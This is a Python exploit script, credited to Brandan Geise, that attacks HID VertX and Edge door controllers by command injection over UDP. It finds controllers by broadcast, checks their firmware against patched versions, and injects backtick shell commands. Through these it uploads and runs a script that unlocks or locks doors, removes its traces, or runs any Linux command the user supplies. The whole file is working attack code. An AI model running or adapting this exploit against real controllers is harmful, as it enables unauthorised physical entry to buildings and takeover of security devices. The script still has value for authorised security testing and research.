#!/usr/bin/env python
# Copyright (c) 2016, Brandan Geise [coldfusion]
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
import argparse
import time
from socket import *

def main():
	parser = argparse.ArgumentParser(description='Command Injection on HID VertX and Edge Door Controllers')
	parser.add_argument('-i', '--ip', help='IP address of VertX controller, (default 255.255.255.255)', default='255.255.255.255', required=False)
	parser.add_argument('-p', '--port', help='Port of VertX controller, (default 4070)', default=4070, type=int, required=False)
	parser.add_argument('--action', help='Unlock or lock or doors', choices=['unlock', 'lock'], default=None, required=False)
	parser.add_argument('--raw', help='Raw Linux command as payload (hint: ping -c 5 IP_ADDRESS)', action='store_true', required=False)
	args = parser.parse_args()

	s = socket(AF_INET, SOCK_DGRAM)
	s.settimeout(5)
	if args.ip == '255.255.255.255':
		s.bind(('', 0))
		s.setsockopt(SOL_SOCKET, SO_BROADCAST, 1)

	# Send discovery request
	response_data = send_command(s, 'discover;013;', '', args.ip, args.port)
	if response_data:
		mac_address, board = fingerprint_controller(response_data)

		# Send raw Linux command line payload
		if args.raw:
			payload = "{0};1`{1}`;".format(mac_address, ' '.join(args.raw))
			send_command(s, 'command_blink_on;', payload, args.ip, args.port)

		# Unlock doors
		elif args.action == 'unlock':
			commands = ["export QUERY_STRING=\"?ID=0&BoardType={0}&Description=Strike&Relay=1&Action=1\"".format(board),
				'/mnt/apps/web/cgi-bin/diagnostics_execute.cgi',
				'chmod -x /mnt/apps/web/cgi-bin/diagnostics_execute.cgi'
			]

			print_status('Unlocking doors...')
			upload_script(s, commands, mac_address, args.ip, args.port)

		# Lock doors
		elif args.action == 'lock':
			commands = ['chmod +x /mnt/apps/web/cgi-bin/diagnostics_execute.cgi',
				"export QUERY_STRING=\"?ID=0&BoardType={0}&Description=Strike&Relay=1&Action=0\"".format(board),
				"/mnt/apps/web/cgi-bin/diagnostics_execute.cgi"
			]

			print_status('Locking doors...')
			upload_script(s, commands, mac_address, args.ip, args.port)

	s.close()			

# Get information about VertX controller
def fingerprint_controller(data):
	response_data = data[0].split(';')
	print_good("VertX Controller Information")
	print "RAW (ASCII): {0}".format(data)
	print "Name: {0}".format(response_data[3])
	print "Model: {0}".format(response_data[6])
	print "Version: {0} - ({1})".format(response_data[7], response_data[8])
	print "IP Address: {0}".format(response_data[4])
	print "MAC Address: {0}".format(response_data[2])
	print "Vulnerable: {0}\n".format(check_version(response_data[7]))

	return response_data[2], response_data[6]

# Check of VertX/Edge controller is vulnerable
def check_version(version):
	vulnerable = False

	# Legacy VertX/Edge controllers patched with 2.2.7.568
	if int(version[0]) == 2 and int(version.replace('.', '')) < 227568:
		vulnerable = True

	# EVO VertX/Edge controllers patched with 3.5.1.1483
	elif int(version[0]) == 3 and int(version.replace('.', '')) < 3511483:
		vulnerable = True

	else:
		vulnerable = None

	return vulnerable

# Upload script
def upload_script(s, commands, mac, ip, port):
	command = 'command_blink_on;'

	payload_chunks = list(chunk_string('!'.join(commands), 22))
	for payload_chunk in payload_chunks:
		payload = "{0};1`echo '{1}' >> /tmp/a`;".format(mac, payload_chunk)
		send_command(s, command, payload, ip, port)

	time.sleep(1)

	# Remove newlines
	payload = "{0};1`tr -d '\n' < /tmp/a > /tmp/b`;".format(mac)
	send_command(s, command, payload, ip, port)

	# Replace intended newlines
	payload = "{0};1`tr '!' '\n' < /tmp/b > /tmp/a`;".format(mac)
	send_command(s, command, payload, ip, port)

	# Make script executable
	payload = "{0};1`chmod +x /tmp/a`;".format(mac)
	send_command(s, command, payload, ip, port)

	# Execute uploaded script
	payload = "{0};1`/tmp/a`;".format(mac)
	send_command(s, command, payload, ip, port)

	print_status('Sleeping for 10 seconds before cleaning up...')
	time.sleep(10)

	# Remove uploaded scripts
	payload = "{0};1`rm /tmp/a`;".format(mac)
	send_command(s, command, payload, ip, port)

	payload = "{0};1`rm /tmp/b`;".format(mac)
	send_command(s, command, payload, ip, port)

# Trigger command injection
def send_command(s, command, payload, ip, port):
	if len(payload) == 0:
		print_status("Sending discovery request to {0}...".format(ip))
		command_buffer = command
	else:
		print_status("Sending payload: ({0}) to {1}...".format((payload.rstrip()).replace('\n', '\\n'), ip))
		command_buffer = "{0}{1};{2}".format(command, str(len(command) + len(payload) + 4).zfill(3), payload)

	s.sendto(command_buffer, (ip, port))

	# Parse response
	try:
		payload_response = None
		payload_response = s.recvfrom(1024)
		if len(payload) == 0:
			return payload_response
		else:
			if payload_response[0].split(';')[0] == 'ack':
				print_good('Command sent successfully')

	except Exception, error:
		print_error('VertX controller did not send a response!')

# Split command because of 22 character length limit
def chunk_string(command, length):
	return (command[0 + i:length + i] for i in range(0, len(command), length))

def print_error(msg):
	print "\033[1m\033[31m[-]\033[0m {0}".format(msg)
	
def print_status(msg):
	print "\033[1m\033[34m[*]\033[0m {0}".format(msg)
		
def print_good(msg):
	print "\033[1m\033[32m[+]\033[0m {0}".format(msg)
	
def print_warn(msg):
	print "\033[1m\033[33m[!]\033[0m {0}".format(msg)

if __name__ == '__main__':
	main()
